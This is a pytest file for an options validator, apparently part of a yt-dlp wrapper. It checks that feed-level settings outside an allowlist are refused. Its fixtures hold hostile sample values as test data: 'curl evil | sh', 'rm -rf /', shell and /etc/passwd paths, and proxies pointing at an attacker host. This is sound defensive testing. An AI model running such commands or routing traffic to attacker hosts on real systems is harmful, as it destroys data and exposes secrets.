from __future__ import annotations

from typing import Any

import pytest

from copycast.domain.engine_options import (
    ENGINE_OWNED_OPTIONS,
    FEED_EXTRACTOR_ARGS,
    FEED_OPTIONS,
    EngineOptionRejected,
    EngineOptions,
)

PLAN_OWNED = {
    "outtmpl",
    "outtmpl_na_placeholder",
    "paths",
    "download_archive",
    "progress_hooks",
    "postprocessor_hooks",
    "post_hooks",
    "logger",
    "postprocessors",
    "format",
    "extract_flat",
    "writeinfojson",
    "writethumbnail",
    "writesubtitles",
    "skip_download",
    "simulate",
    "quiet",
    "noprogress",
    "daterange",
    "playlist_items",
    "noplaylist",
    "exec",
    "exec_cmd",
    "external_downloader",
    "external_downloader_args",
    "ffmpeg_location",
    "cookiesfrombrowser",
    "load_info_filename",
    "batchfile",
    "daemonize",
}

# One value of the right shape for every allowlisted key.
ALLOWED_SAMPLE: dict[str, Any] = {
    "format_sort": ["abr", "ext:m4a"],
    "format_sort_force": True,
    "prefer_free_formats": False,
    "ratelimit": 1_000_000,
    "throttledratelimit": 50_000,
    "sleep_interval": 2,
    "max_sleep_interval": 5.5,
    "sleep_interval_requests": 0.5,
    "sleep_interval_subtitles": 1,
    "retries": 10,
    "fragment_retries": 10,
    "extractor_retries": 3,
    "file_access_retries": 3,
    "socket_timeout": 60,
    "concurrent_fragment_downloads": 4,
    "skip_unavailable_fragments": True,
    "writeautomaticsub": True,
    "subtitleslangs": ["de", "-live_chat"],
    "subtitlesformat": "vtt",
    "geo_bypass": True,
    "geo_bypass_country": "CH",
    "geo_bypass_ip_block": "1.2.3.0/24",
    "age_limit": 18,
    "extractor_args": {
        "youtube": {"lang": ["fr"], "player_client": ["web", "ios"], "skip": ["dash"]},
        "youtubetab": {"approximate_date": ["true"]},
        "generic": {"impersonate": ["chrome"]},
    },
}

# Every family the allowlist must refuse, by why.
REFUSED_FAMILIES: dict[str, dict[str, Any]] = {
    "commands": {
        "netrc_cmd": "curl evil | sh",
        "exec": "rm -rf /",
        "exec_cmd": ["id"],
        "external_downloader": {"default": "/bin/sh"},
        "external_downloader_args": {"default": ["-c", "id"]},
        "postprocessors": [{"key": "Exec", "exec_cmd": "id"}],
        "postprocessor_args": {"ffmpeg": ["-i", "/etc/passwd"]},
        "ffmpeg_location": "/tmp/evil",
        "js_runtimes": {"node": {"path": "/tmp/evil"}},
        "remote_components": ["ejs:github"],
    },
    "paths": {
        "outtmpl": "/etc/%(id)s",
        "paths": {"home": "/"},
        "download_archive": "/etc/passwd",
        "load_info_filename": "/etc/passwd",
        "cachedir": "/tmp",
        "batchfile": "/etc/passwd",
        "print_to_file": {"video": [["%(id)s", "/tmp/x"]]},
        "writedescription": True,
        "writelink": True,
        "enable_file_urls": True,
        "netrc_location": "/root",
        "cookiefile": "/etc/passwd",
        "client_certificate": "/k.pem",
        "client_certificate_key": "/k.pem",
        "client_certificate_password": "x",
    },
    "credentials": {
        "username": "u",
        "password": "p",
        "videopassword": "p",
        "ap_mso": "m",
        "ap_username": "u",
        "ap_password": "p",
        "usenetrc": True,
        "cookiesfrombrowser": ["firefox"],
        "mark_watched": True,
        "debug_printtraffic": True,
        "verbose": True,
    },
    "egress": {
        "proxy": "http://attacker:3128",
        "geo_verification_proxy": "http://attacker:3128",
        "source_address": "10.0.0.1",
        "nocheckcertificate": True,
        "prefer_insecure": True,
        "legacyserverconnect": True,
        "impersonate": "chrome",
        "http_headers": {"Ytdl-Request-Proxy": "http://attacker:3128"},
    },
    "hooks": {
        "progress_hooks": [],
        "postprocessor_hooks": [],
        "post_hooks": [],
        "logger": None,
        "match_filter": None,
        "retry_sleep_functions": {},
    },
    "unknown": {"no_such_param": 1, "compat_opts": ["filename"], "default_search": "ytsearch"},
}


def test_engine_owned_set_is_unchanged() -> None:
    assert set(ENGINE_OWNED_OPTIONS) == PLAN_OWNED


def test_the_allowlist_holds_nothing_engine_owned() -> None:
    assert not set(FEED_OPTIONS) & ENGINE_OWNED_OPTIONS
    assert set(ALLOWED_SAMPLE) == set(FEED_OPTIONS)


def test_global_scope_accepts_operator_options() -> None:
    data = {
        "proxy": "socks5://127.0.0.1:1080",
        "cookiefile": "/c.txt",
        "netrc_location": "/run/secrets",
        "ratelimit": 1_000_000,
    }
    result = EngineOptions.validate_global(data)
    assert result == data
    assert result is not data


@pytest.mark.parametrize("key", sorted(PLAN_OWNED))
def test_every_owned_option_is_rejected_in_both_scopes(key: str) -> None:
    with pytest.raises(EngineOptionRejected) as global_exc:
        EngineOptions.validate_global({key: 1})
    assert global_exc.value.keys == [key] and global_exc.value.scope == "global"
    with pytest.raises(EngineOptionRejected) as feed_exc:
        EngineOptions.validate_feed({key: 1})
    assert feed_exc.value.key == key
    assert feed_exc.value.keys == [key] and feed_exc.value.scope == "feed"


def test_every_allowlisted_option_passes_for_a_feed() -> None:
    assert EngineOptions.validate_feed(ALLOWED_SAMPLE) == ALLOWED_SAMPLE


@pytest.mark.parametrize("family", sorted(REFUSED_FAMILIES))
def test_every_refused_family_is_named_in_full(family: str) -> None:
    data = REFUSED_FAMILIES[family] | {"ratelimit": 5}
    with pytest.raises(EngineOptionRejected) as excinfo:
        EngineOptions.validate_feed(data)
    assert excinfo.value.keys == sorted(REFUSED_FAMILIES[family])
    kept, refused = EngineOptions.sanitize_feed(data)
    assert kept == {"ratelimit": 5} and refused == sorted(REFUSED_FAMILIES[family])


def test_netrc_cmd_is_refused_for_a_feed() -> None:
    with pytest.raises(EngineOptionRejected, match="netrc_cmd"):
        EngineOptions.validate_feed({"netrc_cmd": "touch /tmp/pwned"})


@pytest.mark.parametrize("key", ["NETRC_CMD", "Netrc_Cmd", "netrc_cmd ", " proxy", "Format_Sort"])
def test_case_and_whitespace_variants_are_refused(key: str) -> None:
    with pytest.raises(EngineOptionRejected) as excinfo:
        EngineOptions.validate_feed({key: "x"})
    assert excinfo.value.keys == [key]


def test_non_string_keys_are_refused() -> None:
    kept, refused = EngineOptions.sanitize_feed({1: "x", None: True, ("a",): 1, "age_limit": 3})
    assert kept == {"age_limit": 3}
    assert refused == sorted(["1", "None", "('a',)"])


@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("ratelimit", "1M"),
        ("ratelimit", True),
        ("ratelimit", 0),
        ("retries", 1.5),
        ("retries", 10_000),
        ("sleep_interval", -1),
        ("sleep_interval", 10**9),
        ("socket_timeout", "30"),
        ("concurrent_fragment_downloads", 1000),
        ("age_limit", None),
        ("geo_bypass", "yes"),
        ("subtitleslangs", "de"),
        ("subtitleslangs", ["de", 1]),
        ("subtitleslangs", ["x" * 65]),
        ("subtitleslangs", ["de"] * 33),
        ("subtitlesformat", ""),
        ("format_sort", {"abr": 1}),
        ("extractor_args", ["youtube"]),
        ("extractor_args", "youtube:lang=fr"),
    ],
)
def test_a_value_of_the_wrong_shape_refuses_its_key(key: str, value: Any) -> None:
    with pytest.raises(EngineOptionRejected) as excinfo:
        EngineOptions.validate_feed({key: value})
    assert excinfo.value.keys == [key]


def test_extractor_args_are_allowlisted_entry_by_entry() -> None:
    data = {
        "extractor_args": {
            "youtube": {
                "lang": ["fr"],
                "innertube_host": ["attacker.example"],
                "po_token": ["web+abc"],
                "player_client": "web",
            },
            "youtube-ejs": {"repo": ["attacker/ejs"], "dev": ["true"]},
            "youtubepot-bgutilscript": {"script_path": ["/tmp/evil.js"]},
            "generic": {"hls_key": ["http://10.0.0.1/key"], "impersonate": ["chrome"]},
            "YouTube": {"lang": ["de"]},
            "youtubetab": "approximate_date",
            7: {"lang": ["fr"]},
        }
    }
    kept, refused = EngineOptions.sanitize_feed(data)
    assert kept == {
        "extractor_args": {"youtube": {"lang": ["fr"]}, "generic": {"impersonate": ["chrome"]}}
    }
    assert refused == sorted(
        [
            "extractor_args.youtube.innertube_host",
            "extractor_args.youtube.po_token",
            "extractor_args.youtube.player_client",
            "extractor_args.youtube-ejs",
            "extractor_args.youtubepot-bgutilscript",
            "extractor_args.generic.hls_key",
            "extractor_args.YouTube",
            "extractor_args.youtubetab",
            "extractor_args.7",
        ]
    )
    with pytest.raises(EngineOptionRejected) as excinfo:
        EngineOptions.validate_feed(data)
    assert excinfo.value.keys == refused


def test_extractor_args_with_non_string_argument_names_or_values_are_refused() -> None:
    kept, refused = EngineOptions.sanitize_feed(
        {"extractor_args": {"youtube": {1: ["x"], "lang": [{"path": "/etc"}], "skip": ["hls"]}}}
    )
    assert kept == {"extractor_args": {"youtube": {"skip": ["hls"]}}}
    assert refused == ["extractor_args.youtube.1", "extractor_args.youtube.lang"]


def test_every_allowlisted_extractor_arg_is_a_known_name() -> None:
    assert set(FEED_EXTRACTOR_ARGS) == {"youtube", "youtubetab", "generic"}
    for args in FEED_EXTRACTOR_ARGS.values():
        assert not {"innertube_host", "po_token", "visitor_data", "hls_key"} & args


def test_kept_values_are_copies() -> None:
    langs = ["de"]
    args = {"youtube": {"lang": ["fr"]}}
    kept = EngineOptions.validate_feed({"subtitleslangs": langs, "extractor_args": args})
    kept["subtitleslangs"].append("x")
    kept["extractor_args"]["youtube"]["lang"].append("y")
    assert langs == ["de"] and args == {"youtube": {"lang": ["fr"]}}


def test_empty_extractor_args_are_dropped_silently() -> None:
    assert EngineOptions.validate_feed({"extractor_args": {}}) == {}
    assert EngineOptions.validate_feed({"extractor_args": {"youtube": {}}}) == {}


def test_rejection_lists_every_offending_key_sorted() -> None:
    with pytest.raises(EngineOptionRejected) as excinfo:
        EngineOptions.validate_feed({"quiet": True, "format": "x", "proxy": "y", "ratelimit": 1})
    err = excinfo.value
    assert err.keys == ["format", "proxy", "quiet"]
    assert err.key == "format"
    assert err.slug == "engine-option-rejected"
    assert err.status == 422
    assert err.extras == {"keys": ["format", "proxy", "quiet"], "scope": "feed"}
    assert "format, proxy, quiet" in str(err)
    assert "engine_options" in str(err)


def test_global_message_points_at_the_config_section() -> None:
    with pytest.raises(EngineOptionRejected, match=r"\[engine\.options\]"):
        EngineOptions.validate_global({"outtmpl": "x"})


def test_none_and_empty() -> None:
    assert EngineOptions.validate_global(None) == {}
    assert EngineOptions.validate_global({}) == {}
    assert EngineOptions.validate_feed(None) == {}
    assert EngineOptions.validate_feed({}) == {}
    assert EngineOptions.sanitize_feed(None) == ({}, [])


def test_merge_order_config_then_feed_then_base_last() -> None:
    merged = EngineOptions.merge(
        {"ratelimit": 1, "proxy": "p", "retries": 10},
        {"ratelimit": 2, "subtitleslangs": ["de"]},
        {"retries": 3, "format": "bestaudio"},
    )
    assert merged == {
        "ratelimit": 2,
        "proxy": "p",
        "retries": 3,
        "subtitleslangs": ["de"],
        "format": "bestaudio",
    }


def test_merge_tolerates_missing_layers() -> None:
    assert EngineOptions.merge(None, None) == {}
    assert EngineOptions.merge({"a": 1}, None, None) == {"a": 1}
